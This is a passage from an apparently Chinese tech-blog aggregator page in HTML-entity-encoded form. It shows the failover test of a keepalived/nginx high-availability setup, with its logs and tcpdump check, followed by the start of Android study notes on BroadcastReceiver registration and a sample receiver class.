<h4 id="&#x914D;&#x7F6E;&#x7ED3;&#x675F;">&#x914D;&#x7F6E;&#x7ED3;&#x675F;</h4><p>&#x5728;&#x9ED8;&#x8BA4;&#x7684;keepalive.conf&#x91CC;&#x9762;&#x8FD8;&#x6709; virtual_server,real_server &#x8FD9;&#x6837;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x7528;&#x4E0D;&#x5230;&#xFF0C;&#x5B83;&#x662F;&#x4E3A;lvs&#x51C6;&#x5907;&#x7684;&#x3002; notify &#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x5728;&#x5207;&#x6362;&#x6210;MASTER&#x6216;BACKUP&#x65F6;&#x6267;&#x884C;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x5982;&#x6709;&#x9700;&#x6C42;&#x8BF7;&#x81EA;&#x884C;google&#x3002; </p>
<p>notify</p>
<h2 id="2-5_nginx&#x914D;&#x7F6E;">2.5 nginx&#x914D;&#x7F6E;</h2><p>&#x5F53;&#x7136;nginx&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x53EF;&#x914D;&#x7F6E;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4E0E;keepalived&#x5E76;&#x6CA1;&#x6709;&#x8054;&#x7CFB;&#x3002;&#x4F46;&#x8BB0;&#x4F4F;&#xFF0C;2&#x53F0;nginx&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x914D;&#x7F6E;&#x5E94;&#x8BE5;&#x662F;&#x5B8C;&#x5168;&#x4E00;&#x6837;&#x7684;&#xFF08;rsync&#x540C;&#x6B65;&#xFF09;&#xFF0C;&#x8FD9;&#x6837;&#x624D;&#x80FD;&#x505A;&#x5230;&#x5BF9;&#x7528;&#x6237;&#x900F;&#x660E;&#xFF0C;nginx.conf &#x91CC;&#x9762;&#x7684; server_name &#x5C3D;&#x91CF;&#x4F7F;&#x7528;&#x57DF;&#x540D;&#x6765;&#x4EE3;&#x66FF;&#xFF0C;&#x7136;&#x540E;dns&#x89E3;&#x6790;&#x8FD9;&#x4E2A;&#x57DF;&#x540D;&#x5230;&#x865A;&#x62DF;IP 172.29.88.222&#x3002; </p>
<p>&#x66F4;&#x591A;&#x5173;&#x4E8E;nginx&#x5185;&#x5BB9;&#x914D;&#x7F6E;&#x8BF7;&#x53C2;&#x8003; <a href="http://seanlook.com/2015/05/17/nginx-install-and-config/" target="_blank" rel="external">&#x8FD9;&#x91CC;</a> &#x3002; </p>
<h2 id="3-_&#x6D4B;&#x8BD5;">3. &#x6D4B;&#x8BD5;</h2><p>&#x6839;&#x636E;&#x4E0A;&#x9762;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x72B6;&#x6001;&#xFF1A;172.29.88.224 (itoatest1,MASTER,101)&#xFF0C;172.29.88.222&#xFF08;itoatest2,BACKUP,100&#xFF09;&#xFF0C;nginx&#x548C;keepalived&#x90FD;&#x542F;&#x52A8;&#xFF0C;&#x865A;&#x62DF;IP 172.29.88.222 &#x5728; itoatest1 &#x4E0A;&#xFF1A;</p>
<pre><code><span class="array"># </span>&amp;<span class="array">#x</span>4F7F;&amp;<span class="array">#x</span>7528;ip&amp;<span class="array">#x</span>547D;&amp;<span class="array">#x</span>4EE4;&amp;<span class="array">#x</span>914D;&amp;<span class="array">#x</span>7F6E;&amp;<span class="array">#x</span>7684;&amp;<span class="array">#x</span>5730;&amp;<span class="array">#x</span>5740;&amp;<span class="array">#xFF</span>0C;ifconfig&amp;<span class="array">#x</span>67E5;&amp;<span class="array">#x</span>770B;&amp;<span class="array">#x</span>4E0D;&amp;<span class="array">#x</span>4E86;
[root@itoatest1 nginx-<span class="number">1.6</span>]<span class="array"># ip a</span>|grep eth0
<span class="number">2</span>: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu <span class="number">1500</span> qdisc pfifo_fast state UP qlen <span class="number">1000</span>
    inet <span class="number">172.29</span>.88.224/<span class="number">24</span> brd <span class="number">172.29</span>.88.255 scope global eth0
    inet <span class="number">172.29</span>.88.222/<span class="number">32</span> scope global eth0
</code></pre><p>&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE; 172.29.88.222 &#x6216;&#x57DF;&#x540D;&#xFF0C;OK&#x3002;</p>
<p>&#x76F4;&#x63A5;&#x5173;&#x95ED; itoatest1 &#x4E0A;&#x7684;nginx&#xFF1A; /usr/local/nginx-1.6/sbin/nginx -s stop &#xFF1A; </p>
<pre><code>[root@localhost keepalived]<span class="comment"># ip a|grep eth0</span>
<span class="number">2</span>: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu <span class="number">1500</span> qdisc pfifo_fast <span class="keyword">state</span> UP qlen <span class="number">1000</span>
    <span class="keyword">inet</span> <span class="number">172.29</span>.<span class="number">88.224</span>/<span class="number">24</span> brd <span class="number">172.29</span>.<span class="number">88.255</span> scope <span class="keyword">global</span> eth0
</code></pre><p>vip&#x6D88;&#x5931;&#xFF0C;&#x6F02;&#x79FB;&#x5230; itoatest2&#xFF1A;</p>
<p><img src="http://img0.tuicool.com/UnURFv.png" alt=""></p>
<p>&#x540C;&#x65F6;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E24;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A; /var/log/messages &#xFF1A; </p>
<pre><code>## <span class="tag">itoatest1</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:01</span> <span class="tag">itoatest1</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[44875]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">Sending</span> <span class="tag">gratuitous</span> <span class="tag">ARPs</span> <span class="tag">on</span> <span class="tag">eth0</span> <span class="tag">for</span> 172<span class="class">.29</span><span class="class">.88</span><span class="class">.222</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:06</span> <span class="tag">itoatest1</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[44875]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">Sending</span> <span class="tag">gratuitous</span> <span class="tag">ARPs</span> <span class="tag">on</span> <span class="tag">eth0</span> <span class="tag">for</span> 172<span class="class">.29</span><span class="class">.88</span><span class="class">.222</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:46</span> <span class="tag">itoatest1</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[44875]</span>: <span class="tag">VRRP_Script</span>(<span class="tag">chk_nginx</span>) <span class="tag">failed</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:48</span> <span class="tag">itoatest1</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[44875]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">Received</span> <span class="tag">higher</span> <span class="tag">prio</span> <span class="tag">advert</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:48</span> <span class="tag">itoatest1</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[44875]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">Entering</span> <span class="tag">BACKUP</span> <span class="tag">STATE</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:48</span> <span class="tag">itoatest1</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[44875]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">removing</span> <span class="tag">protocol</span> <span class="tag">VIPs</span>.
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:48</span> <span class="tag">itoatest1</span> <span class="tag">Keepalived_healthcheckers</span><span class="attr_selector">[44874]</span>: <span class="tag">Netlink</span> <span class="tag">reflector</span> <span class="tag">reports</span> <span class="tag">IP</span> 172<span class="class">.29</span><span class="class">.88</span><span class="class">.222</span> <span class="tag">removed</span>

## <span class="tag">itoatest2</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:00</span> <span class="tag">itoatest2</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[35555]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">Transition</span> <span class="tag">to</span> <span class="tag">MASTER</span> <span class="tag">STATE</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:00</span> <span class="tag">itoatest2</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[35555]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">Received</span> <span class="tag">higher</span> <span class="tag">prio</span> <span class="tag">advert</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:00</span> <span class="tag">itoatest2</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[35555]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">Entering</span> <span class="tag">BACKUP</span> <span class="tag">STATE</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:48</span> <span class="tag">itoatest2</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[35555]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">forcing</span> <span class="tag">a</span> <span class="tag">new</span> <span class="tag">MASTER</span> <span class="tag">election</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:48</span> <span class="tag">itoatest2</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[35555]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">forcing</span> <span class="tag">a</span> <span class="tag">new</span> <span class="tag">MASTER</span> <span class="tag">election</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:49</span> <span class="tag">itoatest2</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[35555]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">Transition</span> <span class="tag">to</span> <span class="tag">MASTER</span> <span class="tag">STATE</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:50</span> <span class="tag">itoatest2</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[35555]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">Entering</span> <span class="tag">MASTER</span> <span class="tag">STATE</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:50</span> <span class="tag">itoatest2</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[35555]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">setting</span> <span class="tag">protocol</span> <span class="tag">VIPs</span>.
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:50</span> <span class="tag">itoatest2</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[35555]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">Sending</span> <span class="tag">gratuitous</span> <span class="tag">ARPs</span> <span class="tag">on</span> <span class="tag">eth0</span> <span class="tag">for</span> 172<span class="class">.29</span><span class="class">.88</span><span class="class">.222</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:50</span> <span class="tag">itoatest2</span> <span class="tag">Keepalived_healthcheckers</span><span class="attr_selector">[35554]</span>: <span class="tag">Netlink</span> <span class="tag">reflector</span> <span class="tag">reports</span> <span class="tag">IP</span> 172<span class="class">.29</span><span class="class">.88</span><span class="class">.222</span> <span class="tag">added</span>
<span class="tag">Jun</span>  5 16<span class="pseudo">:44</span><span class="pseudo">:55</span> <span class="tag">itoatest2</span> <span class="tag">Keepalived_vrrp</span><span class="attr_selector">[35555]</span>: <span class="tag">VRRP_Instance</span>(<span class="tag">VI_1</span>) <span class="tag">Sending</span> <span class="tag">gratuitous</span> <span class="tag">ARPs</span> <span class="tag">on</span> <span class="tag">eth0</span> <span class="tag">for</span> 172<span class="class">.29</span><span class="class">.88</span><span class="class">.222</span>
</code></pre><p>&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;&#x4E24;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6293;&#x5305;&#x6765;&#x67E5;&#x770B; &#x4F18;&#x5148;&#x7EA7;priority &#x7684;&#x53D8;&#x5316;&#xFF1A;</p>
<pre><code>## <span class="tag">itoatest1</span> &amp;<span class="id">#x4E0A</span>;
## &amp;<span class="id">#x76F4</span>;&amp;<span class="id">#x63A5</span>;&amp;<span class="id">#x8F93</span>;&amp;<span class="id">#x51FA</span>;&amp;<span class="id">#xFF0C</span>;&amp;<span class="id">#x6216</span>;&amp;<span class="id">#x540E</span>;&amp;<span class="id">#x52A0</span>; <span class="tag">-w</span> <span class="tag">itoatest-kl</span><span class="class">.cap</span>&amp;<span class="id">#x5B58</span>;&amp;<span class="id">#x5165</span>;&amp;<span class="id">#x6587</span>;&amp;<span class="id">#x4EF6</span>;&amp;<span class="id">#x7528</span>;<span class="tag">wireshark</span>&amp;<span class="id">#x67E5</span>;&amp;<span class="id">#x770B</span>;
# <span class="tag">tcpdump</span> <span class="tag">-vvv</span> <span class="tag">-n</span> <span class="tag">-i</span> <span class="tag">eth0</span> <span class="tag">dst</span> 224<span class="class">.0</span><span class="class">.0</span><span class="class">.18</span> <span class="tag">and</span> <span class="tag">src</span> 172<span class="class">.29</span><span class="class">.88</span><span class="class">.224</span>
</code></pre><p><img src="http://img1.tuicool.com/2QNr6b2.png" alt=""></p>
<h4 id="&#x53C2;&#x8003;">&#x53C2;&#x8003;</h4><p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/EN3U3aN">&#x5F00;&#x59CB;&#x4F7F;&#x7528; HTTP/2</a></li>
<li>2.<a href="/articles/rieyyu">Git 2.4.3 &#x53D1;&#x5E03;</a></li>
<li>3.<a href="/articles/An67f2f">&#x8D85;&#x6162;&#x7684; Facebook…</a></li>
<li>4.<a href="/articles/jiIBf2y">SharePoint 2013 &#x642D;&#x5EFA;&#x8D1F;&#x8F7D;&#x5747;&#x8861;(NLB)</a></li>
<li>5.<a href="/articles/va2QV3m">Git &#x7248;&#x672C;&#x63A7;&#x5236;&#x4E0E;&#x5DE5;&#x4F5C;&#x6D41;</a></li>
<li><p>6.<a href="/articles/iyuUfm">gorouter&#x8C03;&#x7814;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/BvaIFna">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;BvaIFna&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/keepalived/">keepalived</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/6670f22/" title="Android 学习笔记 BroadcastReceiver广播... -" itemprop="url">Android 学习笔记 BroadcastReceiver广播... -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T22:24:37.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="Android_&#x5B66;&#x4E60;&#x7B14;&#x8BB0;_BroadcastReceiver&#x5E7F;&#x64AD;…">Android &#x5B66;&#x4E60;&#x7B14;&#x8BB0; BroadcastReceiver&#x5E7F;&#x64AD;…</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 11:22:00  <a href="/sites/Fn2umm">&#x535A;&#x5BA2;&#x56ED;-&#x539F;&#x521B;&#x7CBE;&#x534E;&#x533A;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/RGogoing/p/4557370.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/RGogoing/p/4557370.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11050070">BroadcastReceiver</a></p>
<p>PS&#xFF1A;&#x4E0D;&#x65AD;&#x63D0;&#x5347;&#x81EA;&#x5DF1;&#xFF0C;&#x662F;&#x4EF6;&#x597D;&#x4E8B;… </p>
<h4 id="&#x5B66;&#x4E60;&#x5185;&#x5BB9;&#xFF1A;">&#x5B66;&#x4E60;&#x5185;&#x5BB9;&#xFF1A;</h4><h4 id="1-BroadcastReceiver&#x7684;&#x4F7F;&#x7528;-">1.BroadcastReceiver&#x7684;&#x4F7F;&#x7528;..</h4><h4 id="2-&#x901A;&#x8FC7;BroadcastReceiver&#x53BB;&#x542F;&#x52A8;Service…">2.&#x901A;&#x8FC7;BroadcastReceiver&#x53BB;&#x542F;&#x52A8;Service…</h4><h4 id="1-BroadcastReceiver…">1.BroadcastReceiver…</h4><p>&#x5E7F;&#x64AD;&#xFFFD;&#xFFFD;&#xFFFD;&#x6536;&#x8005;&#xFF0C;&#x7528;&#x6765;&#x63A5;&#x6536;&#x7CFB;&#x7EDF;&#x548C;&#x5E94;&#x7528;&#x4E2D;&#x7684;&#x5E7F;&#x64AD;…Android&#x5E7F;&#x64AD;&#x673A;&#x5236;&#x7528;&#x7684;&#x5730;&#x65B9;&#x8FD8;&#x662F;&#x5F88;&#x591A;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;&#xFF1A;&#x5F53;&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x901A;&#x8FC7;&#x63A5;&#x6536;&#x8FD9;&#x6761;&#x5E7F;&#x64AD;&#x5C31;&#x80FD;&#x53CA;&#x65F6;&#x505A;&#x51FA;&#x76F8;&#x5E94;&#x7684;&#x54CD;&#x5E94;&#xFF0C;&#x7136;&#x540E;&#x5B8C;&#x6210;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;..&#x8FD9;&#x5C31;&#x662F;&#x5E7F;&#x64AD;&#x7684;&#x673A;&#x5236;…&#x5B83;&#x81EA;&#x8EAB;&#x5E76;&#x4E0D;&#x5B9E;&#x73B0;&#x56FE;&#x5F62;&#x7528;&#x6237;&#x754C;&#x9762;…&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x89E6;&#x53D1;&#x6027;&#x7684;&#x64CD;&#x4F5C;…</p>
<h4 id="&#x4F7F;&#x7528;&#x5E7F;&#x64AD;&#x662F;&#x9700;&#x8981;&#x51E0;&#x4E2A;&#x6B65;&#x9AA4;&#x7684;…">&#x4F7F;&#x7528;&#x5E7F;&#x64AD;&#x662F;&#x9700;&#x8981;&#x51E0;&#x4E2A;&#x6B65;&#x9AA4;&#x7684;…</h4><p>i.&#x90A3;&#x5C31;&#x662F;&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x7C7B;&#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E2A;&#x5E7F;&#x64AD;&#xFF0C;&#x518D;&#x7C7B;&#x4E2D;&#x5B9A;&#x4E49;&#x54CD;&#x5E94;&#x7684;&#x65B9;&#x6CD5;…&#x6765;&#x5B8C;&#x6210;&#x4E00;&#x4E9B;&#x54CD;&#x5E94;&#x7684;&#x64CD;&#x4F5C;…</p>
<h4 id="ii-&#x5E7F;&#x64AD;&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;&#x662F;&#x9700;&#x8981;&#x6CE8;&#x518C;&#x7684;&#xFF0C;&#x4E0D;&#x8FDB;&#x884C;&#x6CE8;&#x518C;&#x662F;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x7684;…-">ii.&#x5E7F;&#x64AD;&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;&#x662F;&#x9700;&#x8981;&#x6CE8;&#x518C;&#x7684;&#xFF0C;&#x4E0D;&#x8FDB;&#x884C;&#x6CE8;&#x518C;&#x662F;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x7684;….</h4><h4 id="&#x6CE8;&#x518C;&#x7684;&#x65B9;&#x5F0F;&#x6709;&#x4E24;&#x79CD;&#xFF1A;">&#x6CE8;&#x518C;&#x7684;&#x65B9;&#x5F0F;&#x6709;&#x4E24;&#x79CD;&#xFF1A;</h4><p>&#x4E00;&#x79CD;&#x662F;&#x9759;&#x6001;&#x6CE8;&#x518C;&#xFF0C;&#x9759;&#x6001;&#x6CE8;&#x518C;&#x5C31;&#x662F;&#x914D;&#x7F6E;AndroidManifest.xml&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x914D;&#x7F6E;&#xFF0C;&#x7531;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;receiver,&#x5C5E;&#x4E8E;&#x5E38;&#x9A7B;&#x578B;&#x7684;…</p>
<pre><code><span class="subst">&amp;</span><span class="literal">lt</span>;<span class="subst">!--&amp;</span><span class="variable">#x8FD9</span>;<span class="subst">&amp;</span><span class="variable">#x6BB5</span>;<span class="subst">&amp;</span><span class="variable">#x4EE3</span>;<span class="subst">&amp;</span><span class="variable">#x7801</span>;<span class="subst">&amp;</span><span class="variable">#x6DFB</span>;<span class="subst">&amp;</span><span class="variable">#x52A0</span>;<span class="subst">&amp;</span><span class="variable">#x5728</span>;application<span class="subst">&amp;</span><span class="variable">#x4E4B</span>;<span class="subst">&amp;</span><span class="variable">#x95F4</span>;<span class="subst">&amp;</span><span class="variable">#x5C31</span>;<span class="subst">&amp;</span><span class="variable">#x53EF</span>;<span class="subst">&amp;</span><span class="variable">#x4EE5</span>;<span class="subst">&amp;</span><span class="variable">#x4E86</span>;<span class="subst">&amp;</span><span class="variable">#x3002</span>;<span class="subst">&amp;</span><span class="variable">#x3002</span>;<span class="subst">&amp;</span><span class="variable">#x3002</span>;<span class="subst">--&amp;</span><span class="literal">gt</span>;
<span class="subst">&amp;</span><span class="literal">lt</span>;receiver android:name<span class="subst">=&amp;</span>quot;<span class="built_in">.</span>MyBroadcast<span class="subst">&amp;</span>quot;
                  android:enabled<span class="subst">=&amp;</span>quot;<span class="literal">true</span><span class="subst">&amp;</span>quot;<span class="subst">&amp;</span><span class="literal">gt</span>;
            <span class="subst">&amp;</span><span class="literal">lt</span>;intent<span class="attribute">-filter</span><span class="subst">&amp;</span><span class="literal">gt</span>;
                <span class="subst">&amp;</span><span class="literal">lt</span>;action android:name<span class="subst">=&amp;</span>quot;android<span class="built_in">.</span>intent<span class="built_in">.</span>action<span class="built_in">.</span>EDIT<span class="subst">&amp;</span>quot;<span class="subst">/</span><span class="subst">&amp;</span><span class="literal">gt</span>;
            <span class="subst">&amp;</span><span class="literal">lt</span>;/intent<span class="attribute">-filter</span><span class="subst">&amp;</span><span class="literal">gt</span>;
<span class="subst">&amp;</span><span class="literal">lt</span>;/receiver<span class="subst">&amp;</span><span class="literal">gt</span>;
</code></pre><p>&#x4E8C;&#x79CD;&#x5219;&#x662F;&#x52A8;&#x6001;&#x6CE8;&#x518C;…&#x5C5E;&#x4E8E;&#x975E;&#x5E38;&#x9A7B;&#x578B;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x9690;&#x85CF;&#x5728;&#x4EE3;&#x7801;&#x5757;&#x4E4B;&#x95F4;…&#x4E0D;&#x5BB9;&#x6613;&#x53D1;&#x73B0;…</p>
<pre><code>private <span class="class">BroadcastReceiver</span> receiver;

receiver=new <span class="class">CallReceiver</span>();
//&amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6001</span>;&amp;<span class="symbol">#x6CE8</span>;&amp;<span class="symbol">#x518C</span>;&amp;<span class="symbol">#x5E7F</span>;&amp;<span class="symbol">#x64AD</span>;&amp;<span class="symbol">#x5730</span>;&amp;<span class="symbol">#x5740</span>;...
registerReceiver(receiver,new <span class="class">IntentFilter</span>(&amp;quot;android.intent.action.<span class="class">EDIT</span>&amp;quot;));
//&amp;<span class="symbol">#x89E3</span>;&amp;<span class="symbol">#x9664</span>;&amp;<span class="symbol">#x6CE8</span>;&amp;<span class="symbol">#x518C</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x5E7F</span>;&amp;<span class="symbol">#x64AD</span>;&amp;<span class="symbol">#x5730</span>;&amp;<span class="symbol">#x5740</span>;&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x8981</span>;&amp;<span class="symbol">#x5BF9</span>;&amp;<span class="symbol">#x5E7F</span>;&amp;<span class="symbol">#x64AD</span>;&amp;<span class="symbol">#x673A</span>;&amp;<span class="symbol">#x5236</span>;&amp;<span class="symbol">#x8FDB</span>;&amp;<span class="symbol">#x884C</span>;&amp;<span class="symbol">#x6CE8</span>;&amp;<span class="symbol">#x9500</span>;...
unregisterReceiver(receiver);
</code></pre><p>iii.&#x6CE8;&#x518C;&#x5B8C;&#x6210;&#x540E;&#x5C31;&#x662F;&#x8FDB;&#x884C;&#x53D1;&#x9001;&#x5E7F;&#x64AD;&#x4E86;…&#x8FD9;&#x6837;&#x5E7F;&#x64AD;&#x63A5;&#x6536;&#x8005;&#x5C31;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C;&#x4E86;…&#x5148;&#x6784;&#x5EFA;&#x4E00;&#x4E2A;Intent&#x5BF9;&#x8C61;&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;sendBroadcast(Intent)&#x65B9;&#x6CD5;&#x5C06;&#x5E7F;&#x64AD;&#x53D1;&#x51FA;… </p>
<p>&#x8FD8;&#x6709;&#x4E00;&#x70B9;&#x5C31;&#x662F;&#xFF0C;&#x5BF9;&#x8C61;&#x8C03;&#x7528;&#x4E86;onReceive()&#x65B9;&#x6CD5;&#x65F6;&#x5E7F;&#x64AD;&#x624D;&#x662F;&#x6709;&#x6548;&#x7684;&#xFF0C;&#x5F53;&#x4ECE;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x4E4B;&#x540E;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x5C31;&#x65E0;&#x6548;&#x4E86;..&#x56E0;&#x6B64; <strong>&#x5E7F;&#x64AD;&#x7684;&#x751F;&#x547D;&#x5468;&#x671F;&#x662F;&#x975E;&#x5E38;&#x77ED;&#x6682;&#x7684;&#xFF0C;</strong> &#x4E5F;&#x5C31;&#x4EC5;&#x4EC5;&#x5341;&#x51E0;&#x79D2;&#x7684;&#x751F;&#x547D;&#x5468;&#x671F;&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x8981;&#x5728;&#x5176;&#x4E2D;&#x52A0;&#x5165;&#x4E00;&#x4E9B;&#x8017;&#x65F6;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x8017;&#x65F6;&#x7684;&#x64CD;&#x4F5C;&#x53EF;&#x4EE5;&#x4EA4;&#x7ED9;Service&#x53BB;&#x5B8C;&#x6210;&#xFF0C;&#x5E7F;&#x64AD;&#x5C31;&#x662F;&#x5B8C;&#x6210;&#x4E00;&#x4E9B;&#x975E;&#x5E38;&#x5C0F;&#x7684;&#x64CD;&#x4F5C;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;…&#x7C98;&#x4E00;&#x4E2A;&#x4EE3;&#x7801;… </p>
<pre><code><span class="keyword">package</span> com.example.broadcast_receiver;
<span class="keyword">import</span> android.content.<span class="type">BroadcastReceiver</span>;
<span class="keyword">import</span> android.content.<span class="type">Context</span>;
<span class="keyword">import</span> android.content.<span class="type">Intent</span>;
<span class="keyword">import</span> android.widget.<span class="type">Toast</span>;
public <span class="class"><span class="keyword">class</span> <span class="title">MyBroadcast</span> <span class="keyword"><span class="keyword">extends</span></span> <span class="title">BroadcastReceiver</span>{</span>
    <span class="annotation">@Override</span>
    public void onReceive(<span class="type">Context</span> context, <span class="type">Intent</span> intent) {
        <span class="comment">// <span class="doctag">TODO</span> Auto-generated method stub</span>
        <span class="type">String</span> str=intent.getStringExtra(&amp;quot;msg&amp;quot;);
        <span class="type">Toast</span>.makeText(context, str, <span class="type">Toast</span>.<span class="type">LENGTH_SHORT</span>).show();
    }
}
